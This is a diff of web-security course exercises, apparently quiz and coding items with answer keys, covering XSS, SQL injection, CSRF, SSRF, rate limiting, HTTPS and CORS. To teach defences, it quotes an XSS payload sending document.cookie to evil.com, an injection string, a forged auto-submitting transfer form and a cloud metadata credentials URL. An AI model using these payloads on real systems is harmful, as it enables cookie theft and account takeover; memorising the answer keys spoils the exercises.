@@ -346,17 +346,21 @@ export default function SignIn() {
     difficulty: Difficulty.INTERMEDIATE,
     topic: Topic.API_DESIGN,
     course: Course.WEB_DEV,
-    question: 'Your React app renders user-generated blog posts. A user submits a post containing: <img src="x" onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">\n\nWhat type of XSS attack is this, and how does each XSS variant work?',
+    question: `Your React app shows blog posts by passing each post's saved HTML to dangerouslySetInnerHTML. A user saves a post containing:
+
+<img src="x" onerror="fetch('https://evil.com/steal?c=' + document.cookie)">
+
+Every reader who opens the post now runs the onerror code. What kind of XSS is this, and what would have stopped it?`,
     options: [
-      { id: 'a', text: 'This is Stored XSS -- the malicious script is saved to your database and executes for every user who views the post. Reflected XSS embeds the script in a URL parameter that gets rendered server-side. DOM XSS manipulates the page\'s JavaScript to inject content client-side (e.g., via innerHTML). React escapes JSX by default, but dangerouslySetInnerHTML bypasses this protection. Content Security Policy (CSP) headers block inline scripts even if injection occurs.', isCorrect: true },
-      { id: 'b', text: 'This is Reflected XSS because the image tag reflects back from the server. Stored XSS only applies to JavaScript files stored on the server. DOM XSS is a browser bug, not an application vulnerability.', isCorrect: false },
-      { id: 'c', text: 'This is DOM XSS because it manipulates an HTML element (img). React prevents all XSS by default, including dangerouslySetInnerHTML, so this attack would not work in any React app.', isCorrect: false },
-      { id: 'd', text: 'This isn\'t XSS because img tags can\'t execute JavaScript. XSS only works through script tags. No additional protection is needed beyond React\'s default escaping.', isCorrect: false },
+      { id: 'a', text: 'Stored XSS: the payload is saved and runs for every reader; sanitise the HTML (DOMPurify) before rendering it raw', isCorrect: true },
+      { id: 'b', text: 'Reflected XSS: the server echoes the tag back in its response, so escaping the URL\'s query string would stop it', isCorrect: false },
+      { id: 'c', text: 'DOM XSS: React escapes everything it renders, dangerouslySetInnerHTML included, so this cannot run in React', isCorrect: false },
+      { id: 'd', text: 'Not XSS at all: an img tag cannot run JavaScript, because browsers execute code only from inside script tags', isCorrect: false },
     ],
-    explanation: 'Three types of XSS: (1) Stored XSS: The attacker\'s script is saved in your database (e.g., in a blog post, comment, or profile field). Every user who loads that data executes the script. Most dangerous because it affects all visitors. (2) Reflected XSS: The script is embedded in a URL (e.g., search?q=<script>...) and the server reflects it back in the response without sanitizing. Only affects users who click the malicious link. (3) DOM XSS: The page\'s own JavaScript takes untrusted data (like location.hash) and inserts it into the DOM via innerHTML, document.write, or eval. React\'s JSX auto-escapes content, but dangerouslySetInnerHTML renders raw HTML -- if you must use it, sanitize with DOMPurify first. CSP headers (Content-Security-Policy: script-src \'self\') block inline scripts, adding a crucial defense layer.',
+    explanation: `This is stored XSS: the attacker's markup is saved in your database and runs in the browser of everyone who views the post, which makes it the most damaging kind. Reflected XSS instead comes from the request itself (a script in a search URL that the page echoes back), and DOM XSS is your own client code putting untrusted data into the page through innerHTML, document.write or eval. Any attribute that takes code runs it: onerror fires as soon as the image fails to load. React escapes text you render with {post.body}, which is why plain JSX is safe; dangerouslySetInnerHTML turns that off, so sanitise the HTML first with a library such as DOMPurify, or render Markdown to safe elements instead. Two more layers help: a Content-Security-Policy without 'unsafe-inline' blocks inline handlers like onerror, and an httpOnly session cookie never appears in document.cookie.`,
     hints: [
-      'The onerror attribute on an img tag runs JavaScript when the image fails to load',
-      'The script is stored in the database and served to all users who view the post',
+      'Where does the payload live: in the URL, or in your database?',
+      'What does dangerouslySetInnerHTML turn off?',
     ],
     tags: ['xss', 'stored-xss', 'reflected-xss', 'dom-xss', 'csp', 'react-security'],
     concepts: ['web-security-xss'],
@@ -368,81 +372,67 @@ export default function SignIn() {
     difficulty: Difficulty.BEGINNER,
     topic: Topic.API_DESIGN,
     course: Course.WEB_DEV,
-    language: CodeLanguage.PYTHON,
-    question: 'The following Django view has a SQL injection vulnerability. An attacker can send username=\' OR 1=1 -- to dump the entire users table.\n\n1. Identify why the vulnerable version is dangerous\n2. Fix it using parameterized queries\n3. Also show the safe ORM equivalent\n\nThe raw SQL approach is sometimes needed for complex queries that the ORM can\'t express, but it MUST use parameterized queries.',
-    starterCode: `# Imports: JsonResponse from django.http; connection from django.db;
-#          User from django.contrib.auth.models
+    language: CodeLanguage.TYPESCRIPT,
+    question: `This function is open to SQL injection: a username of ' OR '1'='1 returns every user.
 
-# Implement get_user_vulnerable(request) for comparison
+async function findUserUnsafe(username: string) {
+  return prisma.$queryRawUnsafe(
+    \`SELECT id, email FROM "User" WHERE username = '\${username}'\`,
+  );
+}
 
-# Implement get_user_safe_raw(request) using parameterized SQL queries with cursor.execute
+Write two safe versions, each returning the id and email of the users with that username:
+1. findUserRaw(username: string), which keeps the raw SQL but uses Prisma's $queryRaw tagged template, so the value is sent as a query parameter
+2. findUserOrm(username: string), which uses prisma.user.findMany with a where filter and selects only id and email`,
+    starterCode: `async function findUserRaw(username: string) {
+}
 
-# Implement get_user_safe_orm(request) using Django ORM filter
+async function findUserOrm(username: string) {
+}
 `,
     testCases: [
-      {
-        input: 'get_user_safe_raw with parameterized query',
-        expectedOutput: 'cursor.execute with params list [username]',
-        description: 'Should use parameterized query with %s placeholder and params list',
-      },
-      {
-        input: 'get_user_safe_orm with Django ORM',
-        expectedOutput: 'User.objects.filter(username=username).values()',
-        description: 'Should use Django ORM filter which auto-parameterizes',
-      },
+      { input: 'findUserRaw("\' OR \'1\'=\'1")', expectedOutput: '[] (no user has that name)', description: 'The input is sent as a parameter, never as SQL' },
+      { input: 'findUserOrm("ada")', expectedOutput: '[{ id, email }] for ada', description: 'The ORM version filters by username and selects two fields' },
     ],
-    solution: `from django.http import JsonResponse
-from django.db import connection
-from django.contrib.auth.models import User
+    solution: `async function findUserRaw(username: string) {
+  return prisma.$queryRaw\`SELECT id, email FROM "User" WHERE username = \${username}\`;
+}
 
-# VULNERABLE -- DO NOT USE IN PRODUCTION
-def get_user_vulnerable(request):
-    username = request.GET.get('username', '')
-    query = f"SELECT id, username, email FROM users WHERE username = '{username}'"
-    with connection.cursor() as cursor:
-        cursor.execute(query)
-        rows = cursor.fetchall()
-    return JsonResponse({'users': rows}, safe=False)
-
-
-# FIXED: Parameterized raw SQL
-def get_user_safe_raw(request):
-    username = request.GET.get('username', '')
-    query = "SELECT id, username, email FROM users WHERE username = %s"
-    with connection.cursor() as cursor:
-        cursor.execute(query, [username])
-        rows = cursor.fetchall()
-    return JsonResponse({'users': rows}, safe=False)
-
-
-# FIXED: Django ORM (auto-parameterized)
-def get_user_safe_orm(request):
-    username = request.GET.get('username', '')
-    users = User.objects.filter(username=username).values('id', 'username', 'email')
-    return JsonResponse({'users': list(users)}, safe=False)`,
-    explanation: 'SQL injection works because the vulnerable version builds the SQL string by concatenating user input directly: f"...WHERE username = \'{username}\'". An attacker sends username=\' OR 1=1 -- which produces: WHERE username = \'\' OR 1=1 --\' -- the OR 1=1 matches every row, and -- comments out the rest. The fix is parameterized queries: cursor.execute(query, [username]) sends the SQL template and values separately to the database driver. The database treats the parameter as a literal value, not as SQL syntax, so \' OR 1=1 -- is treated as a literal string to match against, not as SQL code. Django\'s ORM (User.objects.filter(username=username)) always uses parameterized queries under the hood, making it safe by default. Use raw SQL only when the ORM can\'t express your query, and ALWAYS use %s placeholders with a params list.',
+async function findUserOrm(username: string) {
+  return prisma.user.findMany({
+    where: { username },
+    select: { id: true, email: true },
+  });
+}`,
+    explanation: `SQL injection happens when user input is pasted into the SQL text. In findUserUnsafe the username ' OR '1'='1 closes the quote and adds a condition that is always true, so the WHERE clause becomes username = '' OR '1'='1' and every row comes back; other inputs can read other tables or drop them. A query parameter keeps the value out of the SQL: the database receives the statement with a placeholder and the value separately, and treats the value only as data. Prisma's $queryRaw tagged template does that for every \${} in it (a tagged template receives the text pieces and the values separately, so Prisma never builds one string), while $queryRawUnsafe takes a finished string and has no way to tell your SQL from the user's; never pass it built-up text. Note there are no quotes around \${username}: the parameter is a value, not text inside a string literal. The ORM call is parameterized for you, which is why prisma.user.findMany is the default and raw SQL is kept for queries the ORM cannot express.`,
     tieredHints: {
-      apiSignature: 'Cursor.execute(sql: str, params: List[Any]) -> None',
-      skeleton: `def get_user_safe_raw(request):
-    username = request.GET.get('username', '')
-    query = "SELECT id, username, email FROM users WHERE username = %s"
-    with connection.cursor() as cursor:
-        cursor.____(query, [____])
-        rows = cursor.fetchall()
-    return JsonResponse({'users': rows}, safe=False)
+      apiSignature: 'prisma.$queryRaw`...` tagged template: each interpolated value is sent as a query parameter',
+      skeleton: `// findUserRaw
+return prisma.____\`SELECT id, email FROM "User" WHERE ____\`;
 
-def get_user_safe_orm(request):
-    username = request.GET.get('username', '')
-    users = User.objects.____(username=username).values('id', 'username', 'email')
-    return JsonResponse({'users': list(users)}, safe=False)`,
+// findUserOrm
+return prisma.user.____({ ____ });`,
     },
     hints: [
-      'The vulnerability is in the f-string that directly interpolates user input into SQL',
-      'cursor.execute() accepts a second argument: a list of parameters that replace %s placeholders',
-      'Django ORM\'s .filter() always uses parameterized queries internally',
+      'The unsafe version builds the SQL text out of the user\'s input',
+      'A tagged template sends each ${} value separately from the SQL text',
+      'Prisma\'s query methods always use parameters',
     ],
-    tags: ['sql-injection', 'parameterized-queries', 'django-orm', 'security'],
+    tags: [
+      'sql-injection',
+      'parameterized-queries',
+      'prisma',
+      'queryRaw',
+      'security',
+    ],
     concepts: ['web-security-input-validation'],
+    requires: [
+      /\$queryRaw\s*(`|\(\s*Prisma\.sql\s*`)/,
+      /^(?![\s\S]*['"]\$\{)/,
+      /^(?![\s\S]*\$queryRawUnsafe)/,
+      /prisma\.user\.findMany\(/,
+      /select:\s*\{/,
+    ],
   },
 
   {
@@ -451,20 +441,30 @@ def get_user_safe_orm(request):
     difficulty: Difficulty.INTERMEDIATE,
     topic: Topic.API_DESIGN,
     course: Course.WEB_DEV,
-    question: 'A user is logged into your banking app (bank.com). They visit a malicious site that contains:\n<form action="https://bank.com/api/transfer" method="POST">\n  <input type="hidden" name="to" value="attacker" />\n  <input type="hidden" name="amount" value="10000" />\n</form>\n<script>document.forms[0].submit()</script>\n\nWhat attack is this, and which defenses actually work?',
+    question: `A user is logged into your banking app at bank.com, whose session cookie is set with SameSite=None. They visit a malicious site containing:
+
+<form action="https://bank.com/api/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker" />
+  <input type="hidden" name="amount" value="10000" />
+</form>
+<script>document.forms[0].submit()</script>
+
+What attack is this, and which defences actually work?`,
     options: [
-      { id: 'a', text: 'This is XSS because the attacker injects a script. Using Content Security Policy headers and React\'s JSX escaping would prevent this attack entirely.', isCorrect: false },
-      { id: 'b', text: 'This is CSRF (Cross-Site Request Forgery). The browser automatically attaches bank.com\'s cookies to the POST request even though it originated from a different site. Defenses: (1) SameSite=Strict or Lax on cookies prevents them from being sent on cross-site requests. (2) CSRF tokens -- a unique token per session that the attacker can\'t guess. (3) Double-submit cookie pattern. Checking the Origin/Referer header also helps.', isCorrect: true },
-      { id: 'c', text: 'This is clickjacking. The attacker overlays an invisible iframe on their page. Setting X-Frame-Options: DENY prevents this attack.', isCorrect: false },
-      { id: 'd', text: 'This attack won\'t work because browsers don\'t allow cross-origin form submissions. CORS would block the request automatically.', isCorrect: false },
+      { id: 'a', text: 'XSS, because the page runs a script; a Content-Security-Policy on bank.com and React\'s escaping would stop it', isCorrect: false },
+      { id: 'b', text: 'CSRF: the browser attaches bank.com\'s cookie to the forged POST; SameSite=Lax or Strict and CSRF tokens stop it', isCorrect: true },
+      { id: 'c', text: 'Clickjacking: the form is a hidden overlay on top of bank.com, and an X-Frame-Options: DENY header stops it', isCorrect: false },
+      { id: 'd', text: 'Nothing happens: CORS stops a page on one origin from submitting a form to another, so the request never leaves', isCorrect: false },
     ],
-    explanation: 'CSRF exploits the fact that browsers automatically attach cookies (including session cookies) to requests to a domain, regardless of which site initiated the request. The attacker\'s page submits a form to bank.com, and the browser sends the user\'s authentication cookies along with it. CORS does NOT prevent this -- CORS restricts reading responses, not sending requests. Form submissions and simple POST requests are not preflight-checked by CORS. Defenses: (1) SameSite cookie attribute (Lax blocks cookies on cross-site POST forms; Strict blocks them on all cross-site requests). (2) Anti-CSRF tokens: the server includes a unique token in each form that the attacker can\'t predict. (3) Check Origin/Referer headers to verify the request came from your own site. Django includes CSRF protection by default via its CsrfViewMiddleware.',
+    explanation: `This is Cross-Site Request Forgery (CSRF). The browser attaches cookies by the request's destination, not by which site started it, so the forged form POST to bank.com carries the user's session cookie and looks like a real transfer. The script runs on the attacker's own page, not on bank.com, so CSP on bank.com and React's escaping are irrelevant, and there is no frame to block. CORS does not help either: it stops a page from reading a cross-origin response, and a plain form submission is sent without any preflight. Defences: SameSite=Lax (cookies are not sent on cross-site POSTs) or Strict (not on any cross-site request); an anti-CSRF token in each form that the attacker cannot know; and checking the Origin header on state-changing requests. Chromium treats a cookie with no SameSite attribute as Lax, but other browsers may not, so set it explicitly. Next.js Server Actions accept only POST and compare the Origin header with the host for this reason.`,
     hints: [
-      'The key insight: browsers send cookies based on the destination domain, not the origin site',
-      'CORS blocks reading responses, not sending requests. Forms don\'t trigger preflight checks.',
+      'Browsers attach cookies by where the request goes, not where it came from',
+      'CORS blocks reading responses, not sending requests; forms are not preflighted',
     ],
     tags: ['csrf', 'samesite', 'csrf-token', 'cookies', 'security'],
-    concepts: ['web-security-csrf', 'web-security-input-validation'],
+    concepts: [
+      'web-security-csrf',
+    ],
   },
 
   {
@@ -473,17 +473,17 @@ def get_user_safe_orm(request):
     difficulty: Difficulty.ADVANCED,
     topic: Topic.API_DESIGN,
     course: Course.WEB_DEV,
-    question: `Your Next.js app has a Server Component that fetches data from an internal microservice:\n\nconst url = \`http://internal-api:8080/data?id=\${params.id}\`;\nconst res = await fetch(url);\n\nAn attacker sets params.id to "1&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n\nWhat attack is this, and why are Next.js Server Components particularly at risk?`,
+    question: `Your Next.js app has a link-preview feature: a Server Action receives a URL that the user pastes and runs const res = await fetch(url) on the server to read the page's title. An attacker submits http://169.254.169.254/latest/meta-data/iam/security-credentials/. What attack is this, and why is server-side fetching of user input risky?`,
     options: [
-      { id: 'a', text: 'This is SQL injection targeting the internal API. The &url= parameter creates a secondary query. Using parameterized queries in the internal API would prevent this.', isCorrect: false },
-      { id: 'b', text: 'This is XSS because the attacker injects a URL into the page. Content Security Policy would block the request to the metadata endpoint.', isCorrect: false },
-      { id: 'c', text: 'This is SSRF (Server-Side Request Forgery). The attacker manipulates the URL to make YOUR SERVER request internal resources (like AWS metadata endpoints at 169.254.169.254 which contain IAM credentials). Server Components are high-risk because they execute on the server and can reach internal networks. Prevent with URL allowlists, input validation, and never interpolating user input into URLs.', isCorrect: true },
-      { id: 'd', text: 'This won\'t work because Next.js Server Components can\'t make HTTP requests to internal IPs. The fetch API automatically blocks requests to private IP ranges.', isCorrect: false },
+      { id: 'a', text: 'SQL injection: the URL carries a second query, and parameterized queries in the internal API would prevent it', isCorrect: false },
+      { id: 'b', text: 'XSS: the attacker puts a URL into your page, and a Content-Security-Policy header would block the request', isCorrect: false },
+      { id: 'c', text: 'SSRF: your server makes the request from inside your network; allow-list destinations and block private IPs', isCorrect: true },
+      { id: 'd', text: 'Nothing: fetch on the Next.js server refuses private and link-local addresses, so the request never leaves', isCorrect: false },
     ],
-    explanation: 'SSRF (Server-Side Request Forgery) tricks your server into making requests to unintended destinations. The AWS metadata endpoint (169.254.169.254) is a classic SSRF target -- it returns IAM credentials, instance metadata, and secrets that can be used to compromise your entire AWS infrastructure. Next.js Server Components are particularly vulnerable because: (1) They run on the server with access to internal networks. (2) They often fetch from internal APIs. (3) Developers may not realize user input flows into server-side fetch calls. Defenses: (1) Never interpolate user input directly into URLs -- validate and sanitize first. (2) Maintain an allowlist of permitted domains/IPs. (3) Block requests to private IP ranges (10.x, 172.16-31.x, 192.168.x, 169.254.x). (4) Use a URL parser to validate the final resolved URL (watch for DNS rebinding). AWS also offers IMDSv2 which requires a PUT request with a token, mitigating basic SSRF.',
+    explanation: `This is Server-Side Request Forgery (SSRF): the attacker makes your server send a request on their behalf, from inside your network. 169.254.169.254 is the cloud metadata endpoint on AWS (and similar on other clouds), which can return the server's temporary credentials. Server Actions, route handlers and Server Components run on the server, which can reach internal services and metadata endpoints that the attacker's browser cannot, and fetch applies no restriction of its own. A browser CSP does nothing here, because the browser never makes this request. Defences: fetch only from an allow-list of hosts when you can; otherwise parse the URL, allow only http and https, resolve the host name and refuse private, loopback and link-local addresses (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x), and do not follow redirects blindly, since a public URL can redirect to an internal one. On AWS, requiring IMDSv2 (a token obtained with a PUT) blocks this simple GET.`,
     hints: [
-      '169.254.169.254 is the AWS EC2 metadata endpoint -- accessible from any EC2 instance',
-      'Server Components run on the server, so fetch() can reach internal services',
+      '169.254.169.254 is the cloud metadata endpoint, reachable only from inside the server\'s network',
+      'Who actually makes the request: the attacker\'s browser, or your server?',
     ],
     tags: ['ssrf', 'server-components', 'aws', 'internal-network', 'security'],
     concepts: ['next-server-vs-client', 'web-security-input-validation'],
@@ -495,85 +495,91 @@ def get_user_safe_orm(request):
     difficulty: Difficulty.INTERMEDIATE,
     topic: Topic.API_DESIGN,
     course: Course.WEB_DEV,
-    language: CodeLanguage.PYTHON,
-    question: 'Implement rate limiting for a Django REST Framework API to prevent brute-force attacks. Configure:\n- Authenticated users: 100 requests per hour\n- Anonymous users: 20 requests per hour\n- A specific login endpoint: 5 attempts per minute (to prevent password brute-force)\n\nSet up the DRF throttle classes and apply them to a login view.',
-    starterCode: `# settings.py — configure REST_FRAMEWORK defaults and throttle rates for anon, user, and login
+    language: CodeLanguage.TYPESCRIPT,
+    question: `Login attempts must be limited to 5 per minute per IP address. In app/api/login/route.ts write a fixed-window rate limiter:
+1. a Map from IP to { count, windowStart }
+2. rateLimit(ip: string, now = Date.now()), which counts this request and returns { ok: true } while the IP has made at most 5 requests in its current 60-second window, and { ok: false, retryAfter } once it goes over, where retryAfter is the whole number of seconds until the window ends, rounded up; a request after the window has ended starts a new window with a count of 1
+3. a POST handler that takes the IP from the first entry of the x-forwarded-for header (or "unknown"), and when rateLimit says no, answers 429 with a Retry-After header set to retryAfter; otherwise it answers Response.json({ ok: true })
 
-# throttles.py — define custom LoginRateThrottle for login scope
-
-# views.py — apply throttle decorator to login_view endpoint
+The Map lives in one server's memory; a real deployment with several instances keeps the counts in Redis instead.`,
+    starterCode: `// app/api/login/route.ts
 `,
     testCases: [
-      {
-        input: 'REST_FRAMEWORK settings',
-        expectedOutput: 'DEFAULT_THROTTLE_CLASSES with UserRateThrottle and AnonRateThrottle, DEFAULT_THROTTLE_RATES with user: 100/hour and anon: 20/hour',
-        description: 'Should configure default throttle classes and rates in settings',
-      },
-      {
-        input: 'LoginRateThrottle class',
-        expectedOutput: 'class with scope = "login" and rate = "5/min"',
-        description: 'Should create custom throttle with login scope',
-      },
-      {
-        input: 'login_view with throttle',
-        expectedOutput: '@throttle_classes([LoginRateThrottle]) decorator',
-        description: 'Should apply LoginRateThrottle to the login view',
-      },
+      { input: '6 POSTs from one IP within a minute', expectedOutput: '5 x 200, then 429 with Retry-After', description: 'The 6th request in the window is refused' },
+      { input: 'rateLimit(ip, t0 + 61_000) after being limited', expectedOutput: '{ ok: true }', description: 'A new window starts once the old one ends' },
+      { input: 'rateLimit(ip, t0 + 15_500) when over the limit', expectedOutput: '{ ok: false, retryAfter: 45 }', description: 'retryAfter is the seconds left, rounded up' },
     ],
-    solution: `# settings.py excerpt
-REST_FRAMEWORK = {
-    'DEFAULT_THROTTLE_CLASSES': [
-        'rest_framework.throttling.AnonRateThrottle',
-        'rest_framework.throttling.UserRateThrottle',
-    ],
-    'DEFAULT_THROTTLE_RATES': {
-        'anon': '20/hour',
-        'user': '100/hour',
-        'login': '5/min',
-    }
+    solution: `// app/api/login/route.ts
+const LIMIT = 5;
+const WINDOW_MS = 60_000;
+const hits = new Map<string, { count: number; windowStart: number }>();
+
+function rateLimit(ip: string, now = Date.now()) {
+  const entry = hits.get(ip);
+  if (!entry || now - entry.windowStart >= WINDOW_MS) {
+    hits.set(ip, { count: 1, windowStart: now });
+    return { ok: true };
+  }
+  entry.count++;
+  if (entry.count > LIMIT) {
+    const retryAfter = Math.ceil((entry.windowStart + WINDOW_MS - now) / 1000);
+    return { ok: false, retryAfter };
+  }
+  return { ok: true };
 }
 
-
-# throttles.py
-from rest_framework.throttling import AnonRateThrottle
-
-class LoginRateThrottle(AnonRateThrottle):
-    scope = 'login'
-
-
-# views.py
-from rest_framework.decorators import api_view, throttle_classes
-from rest_framework.response import Response
-from .throttles import LoginRateThrottle
-
-@api_view(['POST'])
-@throttle_classes([LoginRateThrottle])
-def login_view(request):
-    username = request.data.get('username')
-    password = request.data.get('password')
-    # ... authentication logic ...
-    return Response({'message': 'Login successful'})`,
-    explanation: 'Rate limiting is essential to prevent: (1) Brute-force password attacks -- without limits, an attacker can try thousands of passwords per second. (2) API abuse -- a single user overwhelming your server. (3) Credential stuffing -- automated attacks using leaked password databases. DRF\'s throttling system uses a cache backend (default: in-memory) to track request counts per client. AnonRateThrottle identifies clients by IP address. UserRateThrottle identifies by user ID (for authenticated users) or IP (for anonymous). The LoginRateThrottle extends AnonRateThrottle because login requests come from unauthenticated users. The scope = "login" maps to the "login" key in DEFAULT_THROTTLE_RATES. When the limit is exceeded, DRF returns a 429 Too Many Requests response with a Retry-After header. For production, use a Redis cache backend instead of in-memory to persist rates across server restarts and support multiple server instances.',
+export async function POST(req: Request) {
+  const ip = req.headers.get("x-forwarded-for")?.split(",")[0].trim() ?? "unknown";
+  const limit = rateLimit(ip);
+  if (!limit.ok) {
+    return new Response("Too many login attempts", {
+      status: 429,
+      headers: { "Retry-After": String(limit.retryAfter) },
+    });
+  }
+  return Response.json({ ok: true });
+}`,
+    explanation: `A fixed-window limiter counts requests per key (here the IP) in windows of a set length. The first request, or the first one after a window has ended, starts a new window with a count of 1; each later request in the window adds 1, and once the count passes the limit the request is refused until the window ends. The answer is 429 Too Many Requests with a Retry-After header in seconds, as the api_design rule card says, so a well-behaved client knows when to try again; Math.ceil rounds up so it never retries a moment too early. Limiting login by IP slows password guessing and credential stuffing (many logins with leaked passwords); a limit per account as well stops an attacker who rotates IPs. Behind a proxy or a host such as Vercel the client's address is the first entry of x-forwarded-for, which only your proxy should be trusted to set. A fixed window lets a burst through at a window's edge (5 at 0:59 and 5 more at 1:00); sliding windows and token buckets smooth that out, and libraries such as @upstash/ratelimit keep the counts in Redis so every server instance shares them.`,
     tieredHints: {
-      apiSignature: 'rest_framework.decorators.throttle_classes(throttle_classes: List[type]) -> Callable',
-      skeleton: `-- ____ rate limiting
-class LoginRateThrottle(AnonRateThrottle):
-    scope = '____'
-
-@api_view(['POST'])
-@____([LoginRateThrottle])
-def login_view(request):
-    username = request.data.get('username')
-    password = request.data.get('password')
-    return Response({'message': 'Login successful'})`,
+      apiSignature: 'new Response(body, { status: 429, headers: { "Retry-After": seconds } })',
+      skeleton: `function rateLimit(ip: string, now = Date.now()) {
+  const entry = hits.get(ip);
+  if (!entry || now - entry.windowStart >= ____) {
+    hits.set(ip, { count: 1, windowStart: now });
+    return { ok: true };
+  }
+  entry.count++;
+  if (entry.count > ____) {
+    const retryAfter = Math.____((entry.windowStart + WINDOW_MS - now) / 1000);
+    return { ok: false, retryAfter };
+  }
+  return { ok: true };
+}`,
     },
     hints: [
-      'DEFAULT_THROTTLE_CLASSES applies globally; @throttle_classes overrides per-view',
-      'LoginRateThrottle extends AnonRateThrottle because login requests are unauthenticated',
-      'The scope attribute maps to the key in DEFAULT_THROTTLE_RATES',
+      'Store a count and a window start time for each IP',
+      'Start a new window when the old one has ended',
+      'Refused requests get 429 and a Retry-After header in seconds',
     ],
-    tags: ['rate-limiting', 'throttling', 'drf', 'brute-force', 'security'],
-    concepts: ['web-security-input-validation'],
+    tags: [
+      'rate-limiting',
+      'route-handler',
+      'nextjs',
+      'brute-force',
+      '429',
+      'security',
+    ],
+    concepts: [
+      'api-rest-conventions',
+    ],
+    requires: [
+      /new\s+Map\b/,
+      /now\s*-\s*[\w.]+\s*[<>]=?|[<>]=?\s*now\s*-|[\w.]+\s*\+\s*[\w.]+\s*[<>]=?\s*now|now\s*[<>]=?\s*[\w.]+\s*\+|\b(\w+)\s*=\s*now\s*-\s*[\w.]+[\s\S]*(?:\b\1\s*[<>]=?|[<>]=?\s*\1\b)/,
+      /Math\.ceil\(/,
+      /status:\s*429/,
+      /["']Retry-After["']/i,
+      /x-forwarded-for/i,
+    ],
   },
 
   // =====================================================================
@@ -586,17 +592,17 @@ def login_view(request):
     difficulty: Difficulty.BEGINNER,
     topic: Topic.PATTERNS_ARCHITECTURAL,
     course: Course.WEB_DEV,
-    question: 'A user at a coffee shop logs into your app over HTTP (not HTTPS). Someone on the same WiFi network is running Wireshark. What can the attacker see, and how does TLS/HTTPS prevent this?',
+    question: `A user at a coffee shop logs into your app over plain HTTP (not HTTPS), while someone on the same Wi-Fi captures the traffic with Wireshark. What can the attacker read, and what does TLS (HTTPS) change?`,
     options: [
-      { id: 'a', text: 'HTTP is safe on private WiFi. TLS is only needed on public networks. The attacker can see URLs but not POST body data because POST data is in the request body, not the URL.', isCorrect: false },
-      { id: 'b', text: 'The attacker can see the traffic, but modern browsers encrypt sensitive form fields (password inputs) automatically even over HTTP. TLS adds extra encryption on top.', isCorrect: false },
-      { id: 'c', text: 'HTTP and HTTPS transmit the same data. HTTPS just adds a padlock icon in the browser. Real security comes from the application code, not the protocol.', isCorrect: false },
-      { id: 'd', text: 'Over HTTP, the attacker sees EVERYTHING in plaintext: URLs, cookies, session tokens, form data (including passwords), API responses. TLS encrypts all data in transit so the attacker sees only encrypted gibberish. TLS also verifies the server\'s identity via certificates, preventing man-in-the-middle attacks where the attacker impersonates your server.', isCorrect: true },
+      { id: 'a', text: 'Only the URLs: form fields sent in a POST body are not readable on the network, so passwords stay private over HTTP', isCorrect: false },
+      { id: 'b', text: 'Nothing sensitive: browsers encrypt password inputs themselves, so HTTPS only adds a second layer on top of that', isCorrect: false },
+      { id: 'c', text: 'The same as over HTTPS: HTTPS only adds the padlock icon, and real protection comes from the application\'s code', isCorrect: false },
+      { id: 'd', text: 'Everything, in plain text, cookies and passwords included; TLS encrypts the traffic and proves the server\'s identity', isCorrect: true },
     ],
-    explanation: 'HTTP sends everything as plaintext. On a shared network, tools like Wireshark can capture every byte: headers, cookies, login credentials, API keys, personal data. A man-in-the-middle (MITM) attacker can even modify requests and responses in transit. TLS (Transport Layer Security) provides: (1) Encryption: All data between client and server is encrypted. Even if intercepted, it\'s unreadable without the session keys. (2) Authentication: The server presents a certificate signed by a trusted Certificate Authority (CA), proving you\'re talking to the real server, not an impersonator. (3) Integrity: Data can\'t be modified in transit without detection. The TLS handshake (simplified): Client says hello with supported cipher suites -> Server responds with its certificate and chosen cipher -> Client verifies the certificate, they agree on session keys using asymmetric cryptography -> All subsequent data is encrypted with symmetric encryption (fast). Always use HTTPS in production. Use HSTS headers to tell browsers to never use HTTP for your domain.',
+    explanation: `HTTP sends every byte as plain text, so anyone on the same network can read the URLs, headers, cookies (including the session cookie), form bodies with passwords, and the responses, and an attacker in the middle can even change them. The request body is no more hidden than the URL, and browsers do not encrypt password fields on their own. TLS gives three things: encryption (captured traffic is unreadable without the session keys), authentication (the server shows a certificate signed by a trusted certificate authority, so you know you reached the real site and not an impersonator) and integrity (changes in transit are detected). Serve everything over HTTPS in production, mark cookies Secure so they are never sent over HTTP, and send an HSTS header so browsers refuse plain HTTP for your domain.`,
     hints: [
-      'HTTP is like sending a postcard -- anyone who handles it can read it',
-      'HTTPS is like putting the postcard in a locked box that only the recipient can open',
+      'HTTP is like sending a postcard: anyone who handles it can read it',
+      'Is a POST body any harder to read on the wire than a URL?',
     ],
     tags: ['https', 'tls', 'encryption', 'mitm', 'security'],
     concepts: ['web-security-input-validation'],
@@ -608,102 +614,82 @@ def login_view(request):
     difficulty: Difficulty.BEGINNER,
     topic: Topic.PATTERNS_ARCHITECTURAL,
     course: Course.WEB_DEV,
-    language: CodeLanguage.PYTHON,
-    question: 'Configure django-cors-headers to allow your Next.js frontend (localhost:3000 in development, myapp.com in production) to make authenticated API requests with cookies.\n\nKey requirements:\n- Preflight OPTIONS requests must succeed\n- Cookies (credentials) must be included in cross-origin requests\n- Only specific origins are allowed (no wildcard *)\n- Explain why CORS_ALLOW_ALL_ORIGINS = True with credentials fails',
-    starterCode: `# settings.py — add 'corsheaders' to INSTALLED_APPS and put
-# 'corsheaders.middleware.CorsMiddleware' first (before CommonMiddleware)
-#
-# Configure these settings:
-#   CORS_ALLOWED_ORIGINS = [frontend dev URL, frontend prod URL]
-#     (use a list — CORS_ALLOW_ALL_ORIGINS=True conflicts with credentials,
-#     so do not use wildcard)
-#   CORS_ALLOW_CREDENTIALS = True  (enable cookies cross-origin)
-#   CORS_ALLOW_HEADERS includes 'content-type' and 'authorization'
-#   CORS_ALLOW_METHODS includes GET/POST/PUT/DELETE/OPTIONS so preflight works
+    language: CodeLanguage.TYPESCRIPT,
+    question: `Your API is a Next.js 15 app on https://api.myapp.com. The front end runs on https://myapp.com (and on http://localhost:3000 in development) and calls the API with fetch(url, { credentials: "include" }), so the session cookie goes along. Write app/api/profile/route.ts:
+1. allowedOrigins, an array of those two front-end origins
+2. corsHeaders(origin: string | null), which returns {} for any origin not in allowedOrigins, and otherwise the CORS headers: Access-Control-Allow-Origin set to that exact origin, Access-Control-Allow-Credentials "true", Access-Control-Allow-Methods "GET, PATCH, OPTIONS", Access-Control-Allow-Headers "Content-Type", and Vary "Origin"
+3. an OPTIONS handler that answers the preflight with status 204, no body and those headers
+4. a GET handler that returns Response.json({ ok: true }) with those headers
+
